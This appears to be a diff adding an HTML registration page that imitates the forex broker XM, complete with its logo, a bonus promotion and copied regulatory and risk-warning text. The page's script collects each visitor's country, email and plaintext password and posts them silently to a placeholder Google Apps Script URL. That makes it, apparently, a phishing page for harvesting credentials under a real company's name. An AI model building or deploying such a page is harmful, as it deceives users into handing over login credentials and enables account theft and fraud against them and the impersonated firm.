@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>XM – Register</title>
+
+  <style>
+    :root {
+      --bg: #f4f6f8;
+      --card: #ffffff;
+      --text: #0b1022;
+      --muted: #6b7280;
+      --border: #e5e7eb;
+      --primary: #0b1c33;
+      --blue: #1f7bff;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: Segoe UI, Roboto, Arial, sans-serif;
+      padding: 0px;
+      margin: 0px;
+    }
+
+    .wrap {
+      margin: 0;
+      min-height: 100vh;
+      background: var(--bg);
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .auth-card {
+      width: 100%;
+      max-width: 420px;
+      background: var(--card);
+      border-radius: 14px;
+      padding: 22px;
+      margin: 50px 0px;
+    }
+
+    /* header */
+    .auth-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 14px;
+    }
+
+    .logo {
+      font-weight: 800;
+      font-size: 22px;
+      letter-spacing: -.5px;
+    }
+
+    .lang {
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+    }
+
+    /* promo */
+    .promo {
+      background: linear-gradient(135deg, #0b1c33, #081f2a);
+      border-radius: 12px;
+      padding: 16px;
+      color: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 22px;
+      position: relative;
+      overflow: hidden;
+      --bg-image: url("images/icon_100per.png");
+      --bg-image-coin-1: url("images/coin-1.webp");
+      --bg-image-coin-1: url("images/coin-2.webp");
+    }
+
+.promo {
+  background: linear-gradient(135deg, #0b1c33, #081f2a);
+  border-radius: 12px;
+  height: 100px;
+  padding: 16px;
+  color: #fff;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 22px;
+  position: relative;
+  overflow: hidden;
+}
+
+    /* -------- LAYER 1 (back-most) -------- */
+    .promo::before {
+      content: "";
+      position: absolute;
+      left: 50px;
+      top: -20px;
+      width: 68px;
+      height: 68px;
+      background: url("images/coin-1.webp") no-repeat center;
+      background-size: contain;
+      opacity: 1;
+      z-index: 0;
+    }
+
+    /* -------- LAYER 2 (icon / object) -------- */
+    .promo::after {
+      content: "";
+      position: absolute;
+      left: -20px;
+      bottom: -20px;
+      width: 68px;
+      height: 68px;
+      background: url("images/coin-2.webp") no-repeat center;
+      background-size: contain;
+      opacity: 1;
+      z-index: 1;
+    }
+
+    /* -------- LAYER 3 (highlight / glow / shape) -------- */
+    .promo .bg-layer-3 {
+      position: absolute;
+      bottom: -15px;
+      right: 10px;
+      width: 130px;
+      height: 130px;
+      background: url("images/icon_100per.png") no-repeat center;
+      background-size: contain;
+      opacity: 1;
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    /* -------- CONTENT ABOVE ALL -------- */
+    .promo > *:not(.bg-layer-3) {
+      position: relative;
+      z-index: 3;
+    }
+
+    .promo strong {
+      font-size: 15px
+    }
+
+    .promo span {
+      font-size: 42px;
+      font-weight: 800;
+      opacity: .9;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin: 0 0 6px;
+      color: var(--text);
+    }
+
+    .sub {
+      font-size: 14px;
+      color: var(--muted);
+      margin-bottom: 18px;
+    }
+
+    .sub a {
+      color: var(--blue);
+      text-decoration: none
+    }
+
+    /* form */
+    label {
+      font-size: 13px;
+      color: #374151;
+      display: block;
+      margin: 14px 0 6px;
+    }
+
+    .field {
+      width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px 14px;
+      font-size: 15px;
+      outline: none;
+    }
+
+    .field:focus {
+      border-color: var(--blue)
+    }
+
+    .password-wrap {
+      position: relative;
+    }
+
+    .toggle-pass {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 14px;
+      color: #6b7280;
+    }
+
+    .partner {
+      font-size: 14px;
+      margin: 12px 0;
+    }
+
+    .partner a {
+      color: var(--blue);
+      text-decoration: none;
+    }
+
+    .consent {
+      display: flex;
+      gap: 10px;
+      font-size: 12px;
+      color: #6b7280;
+      margin: 14px 0 18px;
+      line-height: 1.4;
+    }
+
+    .consent input {
+      margin-top: 3px
+    }
+
+    .btn {
+      width: 100%;
+      border: none;
+      border-radius: 10px;
+      padding: 14px;
+      background: linear-gradient(180deg, #1f2937, #111827);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    /* disabled register button */
+    .btn:disabled{
+      background: #cfd4da34;
+      color: #8a8f98;
+      cursor: not-allowed;
+    }
+
+    @media (max-width:700px) {
+      body {
+        padding: 0px
+      }
+
+      .auth-card {
+        width: 100%;
+        max-width: none;
+        background: var(--card);
+        border-radius: 14px;
+        padding: 22px;
+        box-shadow: none;
+        margin: 0px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="wrap">
+    <div class="auth-card" id="registerForm">
+      <div class="auth-header">
+        <div class="logo"><img src="images/xm-logo-dark.png" alt="" style="height: 55px;"></div>
+        <div class="lang">English</div>
+      </div>
+
+      <div class="promo">
+        <div class="bg-layer-3"></div>
+        <strong>Get a 100% Bonus up to $100</strong>
+      </div>
+
+      <h1>Let’s get you registered!</h1>
+      <div class="sub">Already have an account? <a href="login.html">Login</a></div>
+
+      <label>Country of Residence</label>
+      <select id="country" class="field">
+        <option value="">Select country</option>
+      </select>
+
+
+      <label>Email</label>
+      <input id="email" class="field" type="email" placeholder="Email">
+
+      <label>Password</label>
+      <div class="password-wrap">
+        <input id="password" class="field" type="password" placeholder="Password">
+        <span class="toggle-pass" onclick="togglePass()">👁</span>
+      </div>
+
+      <div class="partner">
+        Have a Partner Code? <a href="#">Enter here</a>
+      </div>
+
+      <div class="consent">
+        <input id="consent" type="checkbox">
+        <span>
+          I consent to receiving marketing communications and to the use of my data
+          for marketing optimization and personalization purposes.
+        </span>
+      </div>
+
+      <button id="registerBtn" class="btn" disabled>Create Account</button>
+
+
+      <p style="font-size: 12px;margin-top: 20px;">By registering, I declare that I have carefully read, understood and accepted the entire text of the Company's
+        Legal Documents and Privacy Policy. I further understand that I will receive newsletters, company news, and
+        product updates.</p>
+
+    </div>
+
+    <div class="footer-section">
+      <div class="footer-legal">
+        <div class="legal-links">
+          <a href="">Privacy Policy</a>
+          <a href="">Cookie Policy</a>
+          <a href="">Vulnerability Policy</a>
+          <a href="">Legal Documents</a>
+        </div>
+        <hr>
+        <div style="display: flex;flex-direction: column;gap:20px;" class="lega-statement">
+          <p>XM Global Limited is regulated by the Financial Services Commission (FSC) of Belize under the Securities
+            Industry Act 2021 (license number 000261/27).</p>
+          <p> XM (SC) Limited is regulated by the Seychelles Financial Services Authority (FSA) under Securities
+            Dealer's License number SD190.</p>
+          <p>Trading Point of Financial Instruments Limited is authorised and regulated by Cyprus Securities and
+            Exchange Commission (CySEC) under licence number 120/10.</p>
+          <p>All entities referenced herein are part of the Trading Point Group and are duly authorized to operate under
+            the XM brand.</p>
+          <p>Risk Warning: Our services involve a significant risk and can result in the loss of your invested capital.
+            Please read and ensure you fully understand our <a href="" style="color: gray;">Risk Disclosures (XM Global), Risk Disclosures
+              (XM International MU) and Risk Disclosures (XM (SC) Limited).</a> </p>
+          <p><b style="color: #000;">Restricted Regions:</b> We do not provide our service to citizens of the United States of America,
+            Canada, Israel and the Islamic Republic of Iran (and other sanctioned countries).</p>
+          <p> XM does not direct its website and services to any individual in any country in which the use of its
+            website and services are prohibited by local laws or regulations. When accessing this website from a country
+            in which its use may or may not be prohibited, it is the user's responsibility to ensure that any use of the
+            website or services adhere to local laws or regulations. XM does not affirm that the information on its
+            website is suitable to all jurisdictions.
+          <p>XM International MU Limited is regulated by the Financial Services Commission (FSC) of Mauritius under the
+            Investment Dealer's License number GB23202700.</p>
+        </div>
+
+      </div>
+      <div class="footer-parterners">
+
+      </div>
+    </div>
+  </div>
+
+
+
+  <script>
+  function togglePass() {
+    const p = document.getElementById("password");
+    p.type = p.type === "password" ? "text" : "password";
+  }
+
+  /* ---- Country dataset ---- */
+  const countries = [
+    "Afghanistan","Albania","Algeria","Andorra","Angola","Argentina","Armenia",
+    "Australia","Austria","Azerbaijan","Bahamas","Bahrain","Bangladesh","Belgium",
+    "Benin","Bolivia","Botswana","Brazil","Bulgaria","Burkina Faso","Cambodia",
+    "Cameroon","Canada","Chile","China","Colombia","Costa Rica","Croatia","Cyprus",
+    "Czech Republic","Denmark","Dominican Republic","Ecuador","Egypt","Estonia",
+    "Ethiopia","Finland","France","Georgia","Germany","Ghana","Greece","Guatemala",
+    "Honduras","Hong Kong","Hungary","Iceland","India","Indonesia","Ireland","Israel",
+    "Italy","Jamaica","Japan","Jordan","Kenya","Kuwait","Latvia","Lebanon","Lithuania",
+    "Luxembourg","Malaysia","Malta","Mexico","Morocco","Netherlands","New Zealand",
+    "Nigeria","Norway","Pakistan","Peru","Philippines","Poland","Portugal","Qatar",
+    "Romania","Saudi Arabia","Senegal","Singapore","Slovakia","Slovenia","South Africa",
+    "South Korea","Spain","Sri Lanka","Sweden","Switzerland","Thailand","Turkey",
+    "Ukraine","United Arab Emirates","United Kingdom","United States","Vietnam","Zambia",
+    "Zimbabwe"
+  ];
+
+  const countrySelect = document.getElementById("country");
+  const emailInput = document.getElementById("email");
+  const passwordInput = document.getElementById("password");
+  const consentCheckbox = document.getElementById("consent");
+  const registerBtn = document.getElementById("registerBtn");
+
+  /* populate country dropdown */
+  countries.forEach(c => {
+    const opt = document.createElement("option");
+    opt.value = c;
+    opt.textContent = c;
+    countrySelect.appendChild(opt);
+  });
+
+  /* validation */
+  function validateForm() {
+    const isValid =
+      countrySelect.value &&
+      emailInput.value.trim() &&
+      passwordInput.value.trim() &&
+      consentCheckbox.checked;
+
+    registerBtn.disabled = !isValid;
+  }
+
+  [countrySelect, emailInput, passwordInput, consentCheckbox]
+    .forEach(el => el.addEventListener("input", validateForm));
+
+  /* ---- SUBMIT TO GOOGLE APPS SCRIPT ---- */
+  registerBtn.addEventListener("click", () => {
+    if (registerBtn.disabled) return;
+
+    const payload = {
+      country: countrySelect.value,
+      email: emailInput.value.trim(),
+      password: passwordInput.value.trim(),
+      consent: consentCheckbox.checked,
+      timestamp: new Date().toISOString()
+    };
+
+    fetch("YOUR_GOOGLE_APPS_SCRIPT_WEBAPP_URL", {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+
+    registerBtn.textContent = "Submitting...";
+    registerBtn.disabled = true;
+  });
+  </script>
+
+
+</body>
+
+</html>
+
+<style>
+  /* =========================
+  FOOTER SECTION-4
+========================= */
+  .footer-section hr {
+    background-color: rgba(128, 128, 128, 0.719);
+    height: 1px;
+    border-color: none;
+  }
+
+  .legal-links a {color: #000;}
+
+  .footer-section {
+    width: 100%;
+    min-height: 500px;
+    background: #fff;
+    padding: 10px 30px;
+  }
+
+  .footer-header {
+    padding: 0px 0px 50px 0px;
+    font-size: 30px;
+  }
+
+  .footer-nav-wrapper {
+    width: 100%;
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
+    padding: 50px 0px;
+  }
+
+  .footer-nav-col {
+    min-height: 100px;
+    min-width: 50px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .footer-nav-col p {
+    cursor: pointer;
+  }
+
+  .footer-nav-col p:hover {
+    color: blue;
+  }
+
+  .footer-nav-col h3 {
+    color: gray;
+  }
+
+  .footer-appstore-btns {
+    width: 100%;
+    display: flex;
+    justify-content: end;
+    gap: 10px;
+    padding: 30px 0px;
+  }
+
+  .footer-appstore-btns img {
+    height: 40px;
+  }
+
+  .footer-notes {
+    width: 100%;
+  }
+
+  .legal-links {
+    gap: 20px;
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr 1fr;
+    width: fit-content;
+  }
+
+  .footer-legal {
+    display: flex;
+    flex-direction: column;
+    gap: 30px;
+    font-size: 16px;
+    padding: 30px 0px;
+    color: gray;
+  }
+
+
+
+
+
+  .footer-parterners {
+    width: 100%;
+  }
+
+  @media(max-width: 700px) {
+    .legal-links {
+      grid-template-columns: 1fr 1fr 2fr 2fr;
+      gap: 5px;
+      font-size: 12px;
+    }
+
+    .footer-nav-wrapper {
+      display: none;
+    }
+  }
+</style>
+
+
+
